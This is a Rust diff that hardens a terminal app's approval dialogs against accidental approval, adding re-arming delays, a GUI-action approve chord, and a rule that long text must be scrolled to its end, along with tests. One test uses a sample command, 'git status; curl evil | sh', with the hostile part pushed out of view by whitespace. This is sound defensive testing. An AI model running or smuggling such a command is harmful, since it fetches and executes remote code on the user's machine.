@@ -1,23 +1,35 @@
 //! The approval dialogs' state and key handling, without any drawing.
 //!
 //! A dialog appears while the user may be typing into a pane, so nothing typed by
-//! habit may answer it with a yes:
+//! habit may answer it with a yes, and the user must be able to see everything
+//! they approve:
 //!
-//! * plain Enter never approves, at any time;
-//! * nothing approves during the first [`ARM_DELAY`] after the dialog opens, so a
-//!   key already on its way (or a double click) lands on nothing;
-//! * approving takes a deliberate chord (Cmd+Enter on macOS, Ctrl+Shift+Enter
-//!   elsewhere) or a click on the Approve button once armed;
+//! * plain Enter (and plain Ctrl+Enter) never approves, at any time;
+//! * nothing approves during the first [`ARM_DELAY`] after the dialog opens, after
+//!   any stray key the dialog swallowed, and after its window regains focus, so a
+//!   key already on its way (or typing that goes on) lands on nothing;
+//! * approving takes a deliberate chord, bound as a GPUI action in the dialog's own
+//!   key context (Cmd+Enter on macOS, Ctrl+Shift+Enter elsewhere, which takes
+//!   precedence over the same chord's workspace binding while the dialog is open; see
+//!   `keybind::dialog_bindings`), or a click on the Approve button once armed;
+//! * text that does not fit its box must be scrolled to the end once before
+//!   Approve works ([`TextView`]);
 //! * Escape denies at any time, since denying is always safe;
-//! * every other key is swallowed by the dialog, so it does not reach the pane.
+//! * "always allow typing" changes only by a click, never by a key.
 
 use std::collections::BTreeSet;
 use std::time::{Duration, Instant};
 
 use halyard_ipc::{PairingDecision, PairingRequest, Scope, SendTextRequest};
 
-/// How long a new dialog ignores approving keys and clicks.
+/// How long a dialog ignores approving keys and clicks after it opens, after a
+/// stray key, and after its window regains focus.
 pub const ARM_DELAY: Duration = Duration::from_millis(700);
+
+/// The longest escaped request a typing dialog shows; the server refuses longer
+/// ones without a dialog. The text typed since the last approval is shown too, and
+/// is bounded by the server at 4 KiB.
+pub const MAX_DIALOG_TEXT_BYTES: usize = halyard_ipc::text::MAX_APPROVAL_DISPLAY_BYTES;
 
 /// The question a dialog asks.
 #[derive(Debug, Clone)]
@@ -48,24 +60,71 @@ pub enum Outcome {
     Ignored,
     /// A checkbox changed; redraw.
     Changed,
+    /// Scroll the text box by this many lines (negative: up); `i32::MAX` is the end.
+    Scroll(i32),
     /// The user approved.
     Approve,
     /// The user denied.
     Deny,
 }
 
-/// The chord that approves, shown on the button.
+/// The chord that approves, as GPUI keystrokes and as shown on the button.
 #[must_use]
-pub fn approve_chord_label(macos: bool) -> &'static str {
-    if macos { "⌘⏎" } else { "Ctrl+Shift+Enter" }
+pub fn approve_chord(macos: bool) -> (&'static str, &'static str) {
+    if macos { ("cmd-enter", "⌘⏎") } else { ("ctrl-shift-enter", "Ctrl+Shift+Enter") }
 }
 
-/// Whether this key press is the approve chord on this platform.
+/// Whether the dialog's text can be seen whole: the scroll gate for Approve.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub enum TextView {
+    /// Not laid out yet: Approve waits.
+    Unknown,
+    /// Everything fits in the box.
+    Fits,
+    /// The box scrolls and the end has not been seen yet.
+    NeedsScroll,
+    /// The box scrolls and the user has seen its end at least once.
+    SeenEnd,
+}
+
+impl TextView {
+    /// The next state, from the box's layout: `laid_out` once it has a size,
+    /// `max` the scrollable height, `scrolled` how far it is scrolled (both in
+    /// pixels, `scrolled` from 0 to `max`). Having seen the end is kept.
+    #[must_use]
+    pub fn observe(self, laid_out: bool, max: f32, scrolled: f32) -> Self {
+        if !laid_out {
+            return self;
+        }
+        if max <= 0.5 {
+            return Self::Fits;
+        }
+        if self == Self::SeenEnd || scrolled >= max - 1.0 {
+            Self::SeenEnd
+        } else {
+            Self::NeedsScroll
+        }
+    }
+
+    /// Whether the user has been able to see all of it.
+    #[must_use]
+    pub fn seen(self) -> bool {
+        matches!(self, Self::Fits | Self::SeenEnd)
+    }
+}
+
+/// "12 characters, 1 line" for the dialog header.
 #[must_use]
-pub fn is_approve_chord(key: &str, m: Mods, macos: bool) -> bool {
-    key == "enter"
-        && !m.alt
-        && if macos { m.platform && !m.control } else { m.control && m.shift && !m.platform }
+pub fn size_label(text: &str) -> String {
+    let chars = text.chars().count();
+    let text = text.replace("\r\n", "\n");
+    let lines = text.split(['\n', '\r']).count();
+    let lines = if text.ends_with(['\n', '\r']) { lines - 1 } else { lines }.max(1);
+    format!(
+        "{chars} character{}, {lines} line{}",
+        if chars == 1 { "" } else { "s" },
+        if lines == 1 { "" } else { "s" }
+    )
 }
 
 /// One open dialog.
@@ -73,11 +132,13 @@ pub fn is_approve_chord(key: &str, m: Mods, macos: bool) -> bool {
 pub struct Dialog {
     /// The question.
     pub ask: Ask,
-    opened: Instant,
+    armed_at: Instant,
     /// Pairing: the scopes currently ticked, a subset of those requested.
     pub scopes: BTreeSet<Scope>,
     /// Pairing: "always allow typing from this tool" is ticked.
     pub always_allow_input: bool,
+    /// Typing: whether the text has been seen whole.
+    pub view: TextView,
 }
 
 impl Dialog {
@@ -85,23 +146,43 @@ impl Dialog {
     /// and "always allow" off.
     #[must_use]
     pub fn new(ask: Ask, now: Instant) -> Self {
-        let scopes = match &ask {
-            Ask::Pairing(r) => r.scopes.clone(),
-            Ask::SendText(_) => BTreeSet::new(),
+        let (scopes, view) = match &ask {
+            Ask::Pairing(r) => (r.scopes.clone(), TextView::Fits),
+            Ask::SendText(_) => (BTreeSet::new(), TextView::Unknown),
         };
-        Self { ask, opened: now, scopes, always_allow_input: false }
+        Self { ask, armed_at: now + ARM_DELAY, scopes, always_allow_input: false, view }
     }
 
-    /// Whether approving is possible yet.
+    /// Whether approving is possible yet, time-wise.
     #[must_use]
     pub fn armed(&self, now: Instant) -> bool {
-        now.duration_since(self.opened) >= ARM_DELAY
+        now >= self.armed_at
     }
 
     /// When the dialog arms.
     #[must_use]
     pub fn arms_at(&self) -> Instant {
-        self.opened + ARM_DELAY
+        self.armed_at
+    }
+
+    /// Starts the arming delay again (a stray key, the window regaining focus).
+    pub fn rearm(&mut self, now: Instant) {
+        self.armed_at = self.armed_at.max(now + ARM_DELAY);
+    }
+
+    /// Why Approve does nothing right now, or `None` when it works.
+    #[must_use]
+    pub fn blocked(&self, now: Instant) -> Option<&'static str> {
+        if !self.view.seen() {
+            return Some("Scroll to the end of the text first");
+        }
+        if matches!(self.ask, Ask::Pairing(_)) && self.scopes.is_empty() {
+            return Some("Tick at least one scope");
+        }
+        if !self.armed(now) {
+            return Some("Wait a moment");
+        }
+        None
     }
 
     /// The scopes the tool asked for, in order, for numbering the checkboxes.
@@ -134,49 +215,50 @@ impl Dialog {
         Outcome::Changed
     }
 
-    /// Ticks or unticks "always allow typing", when offered.
-    pub fn toggle_always(&mut self) -> Outcome {
-        if !self.offers_always() {
+    /// Ticks or unticks "always allow typing", when offered. Only a click calls
+    /// this: no key can widen what a tool may do.
+    pub fn click_always(&mut self, now: Instant) -> Outcome {
+        if !self.offers_always() || !self.armed(now) {
             return Outcome::Ignored;
         }
         self.always_allow_input = !self.always_allow_input;
         Outcome::Changed
     }
 
-    /// A key press at `now`.
-    pub fn key(&mut self, key: &str, m: Mods, macos: bool, now: Instant) -> Outcome {
+    /// A key press that no binding took, at `now`. Approving is not here: it is
+    /// the dialog's own action ([`Dialog::approve_action`]).
+    pub fn key(&mut self, key: &str, m: Mods, now: Instant) -> Outcome {
         if key == "escape" {
             return Outcome::Deny;
         }
-        if !self.armed(now) {
-            return Outcome::Ignored;
+        let plain = !(m.control || m.platform || m.alt);
+        if plain && matches!(self.ask, Ask::SendText(_)) {
+            match key {
+                "down" => return Outcome::Scroll(1),
+                "up" => return Outcome::Scroll(-1),
+                "pagedown" => return Outcome::Scroll(8),
+                "pageup" => return Outcome::Scroll(-8),
+                "end" => return Outcome::Scroll(i32::MAX),
+                "home" => return Outcome::Scroll(i32::MIN),
+                _ => {}
+            }
         }
-        if is_approve_chord(key, m, macos) {
-            return self.approve();
+        if plain
+            && self.armed(now)
+            && let Some(n) = key.parse::<usize>().ok().filter(|n| *n >= 1)
+            && let Some(scope) = self.requested().get(n - 1).copied()
+        {
+            // Unticking narrows a pairing; ticking only restores what was asked.
+            return self.toggle_scope(scope);
         }
-        if m.control || m.platform || m.alt {
-            return Outcome::Ignored;
-        }
-        if let Some(n) = key.parse::<usize>().ok().filter(|n| *n >= 1) {
-            return match self.requested().get(n - 1) {
-                Some(scope) => self.toggle_scope(*scope),
-                None => Outcome::Ignored,
-            };
-        }
-        if key == "t" {
-            return self.toggle_always();
-        }
+        // A stray key: the user is typing, maybe without having seen the dialog.
+        self.rearm(now);
         Outcome::Ignored
     }
 
-    /// A click on Approve at `now`.
-    pub fn click_approve(&mut self, now: Instant) -> Outcome {
-        if self.armed(now) { self.approve() } else { Outcome::Ignored }
-    }
-
-    fn approve(&self) -> Outcome {
-        // A pairing with nothing ticked would be refused by the server anyway.
-        if matches!(self.ask, Ask::Pairing(_)) && self.scopes.is_empty() {
+    /// The approve chord (the dialog's GPUI action) or a click on Approve.
+    pub fn approve_action(&mut self, now: Instant) -> Outcome {
+        if self.blocked(now).is_some() {
             return Outcome::Ignored;
         }
         Outcome::Approve
@@ -216,7 +298,7 @@ pub fn scope_is_sensitive(scope: Scope) -> bool {
 #[cfg(test)]
 mod tests {
     use super::*;
-    use halyard_ipc::PeerInfo;
+    use halyard_ipc::{PeerInfo, SendTextReason, SessionInfo};
 
     fn pairing(scopes: &[Scope]) -> Dialog {
         Dialog::new(
@@ -229,56 +311,94 @@ mod tests {
         )
     }
 
-    const CMD: Mods = Mods { control: false, alt: false, shift: false, platform: true };
+    fn typing(text: &str) -> Dialog {
+        Dialog::new(
+            Ask::SendText(Box::new(SendTextRequest {
+                grant_id: "g".into(),
+                client_name: "tool".into(),
+                session: SessionInfo {
+                    id: "p".into(),
+                    title: String::new(),
+                    cwd: None,
+                    agent: None,
+                    state: None,
+                },
+                text: text.into(),
+                display_text: halyard_ipc::text::escape_for_display(text),
+                reason: SendTextReason::ControlCharacters,
+                peer: PeerInfo { pid: 1, uid: 1, exe: None },
+                typed_since_approval: String::new(),
+                typed_since_approval_display: String::new(),
+                typed_since_approval_truncated: false,
+            })),
+            Instant::now(),
+        )
+    }
+
     const NONE: Mods = Mods { control: false, alt: false, shift: false, platform: false };
-    const CTRL_SHIFT: Mods = Mods { control: true, alt: false, shift: true, platform: false };
 
     #[test]
-    fn plain_enter_never_approves() {
+    fn plain_enter_and_ctrl_enter_never_approve() {
         let mut d = pairing(&[Scope::SessionsRead]);
         let later = d.arms_at() + Duration::from_secs(5);
-        assert_eq!(d.key("enter", NONE, true, later), Outcome::Ignored);
-        assert_eq!(d.key("enter", NONE, false, later), Outcome::Ignored);
-        // Shift+Enter is what a fast typist hits by accident: not enough either.
-        let shift = Mods { shift: true, ..NONE };
-        assert_eq!(d.key("enter", shift, true, later), Outcome::Ignored);
+        for m in [
+            NONE,
+            Mods { shift: true, ..NONE },
+            Mods { control: true, ..NONE },
+            Mods { control: true, shift: true, ..NONE },
+            Mods { platform: true, ..NONE },
+        ] {
+            assert_eq!(d.key("enter", m, later), Outcome::Ignored, "{m:?}");
+        }
+        // Keys never approve; only the dialog's action does.
+        assert_eq!(d.approve_action(later + ARM_DELAY), Outcome::Approve);
     }
 
     #[test]
-    fn the_approve_chord_works_only_once_armed() {
+    fn the_approve_action_works_only_once_armed() {
         let mut d = pairing(&[Scope::SessionsRead]);
         let early = d.arms_at() - Duration::from_millis(1);
-        assert_eq!(d.key("enter", CMD, true, early), Outcome::Ignored);
-        assert_eq!(d.click_approve(early), Outcome::Ignored);
-        let armed = d.arms_at();
-        assert_eq!(d.key("enter", CMD, true, armed), Outcome::Approve);
-        assert_eq!(d.click_approve(armed), Outcome::Approve);
-        // The chord is per platform.
-        assert_eq!(d.key("enter", CTRL_SHIFT, false, armed), Outcome::Approve);
-        assert_eq!(d.key("enter", CMD, false, armed), Outcome::Ignored);
-        assert_eq!(d.key("enter", CTRL_SHIFT, true, armed), Outcome::Ignored);
+        assert_eq!(d.approve_action(early), Outcome::Ignored);
+        assert_eq!(d.blocked(early), Some("Wait a moment"));
+        assert_eq!(d.approve_action(d.arms_at()), Outcome::Approve);
+    }
+
+    #[test]
+    fn a_stray_key_or_refocus_rearms() {
+        let mut d = pairing(&[Scope::SessionsRead]);
+        let t = d.arms_at() + Duration::from_secs(1);
+        assert!(d.armed(t));
+        assert_eq!(d.key("y", NONE, t), Outcome::Ignored);
+        assert!(!d.armed(t), "a stray key starts the delay again");
+        assert_eq!(d.approve_action(t + ARM_DELAY - Duration::from_millis(1)), Outcome::Ignored);
+        assert_eq!(d.approve_action(t + ARM_DELAY), Outcome::Approve);
+        let t2 = t + Duration::from_secs(5);
+        d.rearm(t2);
+        assert!(!d.armed(t2));
     }
 
     #[test]
     fn escape_denies_at_once() {
         let mut d = pairing(&[Scope::SessionsRead]);
-        assert_eq!(d.key("escape", NONE, true, Instant::now()), Outcome::Deny);
+        assert_eq!(d.key("escape", NONE, Instant::now()), Outcome::Deny);
     }
 
     #[test]
-    fn scopes_toggle_by_number_and_always_needs_input_write() {
+    fn always_allow_changes_only_by_click() {
         let mut d = pairing(&[Scope::SessionsRead, Scope::InputWrite]);
         let t = d.arms_at();
         assert!(d.offers_always());
-        assert_eq!(d.key("t", NONE, true, t), Outcome::Changed);
+        assert_eq!(d.key("t", NONE, t), Outcome::Ignored);
+        assert_eq!(d.key("t", Mods { shift: true, ..NONE }, t), Outcome::Ignored);
+        assert!(!d.always_allow_input, "no key ticks it");
+        assert_eq!(d.click_always(t), Outcome::Ignored, "the stray `t` re-armed the dialog");
+        let t = d.arms_at();
+        assert_eq!(d.click_always(t), Outcome::Changed);
         assert!(d.always_allow_input);
-        // InputWrite is the second requested scope (BTreeSet order).
+        // Unticking input:write drops always-allow.
         assert_eq!(d.requested(), vec![Scope::SessionsRead, Scope::InputWrite]);
-        assert_eq!(d.key("2", NONE, true, t), Outcome::Changed);
-        assert!(!d.scopes.contains(&Scope::InputWrite));
-        assert!(!d.always_allow_input, "unticking input:write drops always-allow");
-        assert_eq!(d.key("t", NONE, true, t), Outcome::Ignored);
-        assert_eq!(d.key("9", NONE, true, t), Outcome::Ignored);
+        assert_eq!(d.key("2", NONE, t), Outcome::Changed);
+        assert!(!d.always_allow_input);
         assert_eq!(
             d.pairing_decision(),
             PairingDecision::Approve {
@@ -286,18 +406,64 @@ mod tests {
                 always_allow_input: false
             }
         );
-        // Nothing ticked: approving does nothing.
-        assert_eq!(d.key("1", NONE, true, t), Outcome::Changed);
-        assert_eq!(d.click_approve(t), Outcome::Ignored);
+        // Nothing ticked: approving does nothing, and says why.
+        assert_eq!(d.key("1", NONE, t), Outcome::Changed);
+        assert_eq!(d.approve_action(t), Outcome::Ignored);
+        assert_eq!(d.blocked(t), Some("Tick at least one scope"));
+    }
+
+    /// The scroll gate: fits, needs a scroll, scrolled to the end (kept after
+    /// scrolling back), and unknown before layout.
+    #[test]
+    fn long_text_must_be_scrolled_to_the_end_before_approving() {
+        let mut d = typing("git status");
+        let t = d.arms_at();
+        assert_eq!(d.view, TextView::Unknown);
+        assert_eq!(d.approve_action(t), Outcome::Ignored, "not laid out yet");
+        d.view = d.view.observe(true, 0.0, 0.0);
+        assert_eq!(d.view, TextView::Fits);
+        assert_eq!(d.approve_action(t), Outcome::Approve);
+
+        let mut d = typing(&format!("git status{}; curl evil | sh\n", " ".repeat(2000)));
+        let t = d.arms_at();
+        d.view = d.view.observe(true, 900.0, 0.0);
+        assert_eq!(d.view, TextView::NeedsScroll);
+        assert_eq!(d.blocked(t), Some("Scroll to the end of the text first"));
+        assert_eq!(d.approve_action(t), Outcome::Ignored);
+        d.view = d.view.observe(true, 900.0, 450.0);
+        assert_eq!(d.approve_action(t), Outcome::Ignored, "half way is not the end");
+        d.view = d.view.observe(true, 900.0, 900.0);
+        assert_eq!(d.view, TextView::SeenEnd);
+        d.view = d.view.observe(true, 900.0, 0.0);
+        assert_eq!(d.view, TextView::SeenEnd, "scrolling back keeps it");
+        d.view = d.view.observe(false, 0.0, 0.0);
+        assert_eq!(d.view, TextView::SeenEnd, "a frame without layout changes nothing");
+        assert_eq!(d.approve_action(t), Outcome::Approve);
     }
 
     #[test]
-    fn letters_typed_into_the_dialog_are_swallowed() {
-        let mut d = pairing(&[Scope::SessionsRead]);
+    fn scroll_keys_scroll_and_do_not_rearm() {
+        let mut d = typing("x");
         let t = d.arms_at();
-        for k in ["y", "a", "space", "tab", "c"] {
-            assert_eq!(d.key(k, NONE, true, t), Outcome::Ignored, "{k}");
+        assert_eq!(d.key("end", NONE, t), Outcome::Scroll(i32::MAX));
+        assert_eq!(d.key("pagedown", NONE, t), Outcome::Scroll(8));
+        assert!(d.armed(t));
+    }
+
+    #[test]
+    fn the_size_label_counts_characters_and_lines() {
+        assert_eq!(size_label("git status"), "10 characters, 1 line");
+        assert_eq!(size_label("a\nb\n"), "4 characters, 2 lines");
+        assert_eq!(size_label("é"), "1 character, 1 line");
+        assert_eq!(size_label("\r"), "1 character, 1 line");
+        assert_eq!(size_label("a\r\nb"), "4 characters, 2 lines");
+    }
+
+    #[test]
+    fn the_chord_is_never_plain_or_ctrl_enter() {
+        for macos in [true, false] {
+            let (ks, _) = approve_chord(macos);
+            assert!(!matches!(ks, "enter" | "ctrl-enter" | "shift-enter"), "{ks}");
         }
-        assert_eq!(d.key("c", Mods { control: true, ..NONE }, true, t), Outcome::Ignored);
     }
 }
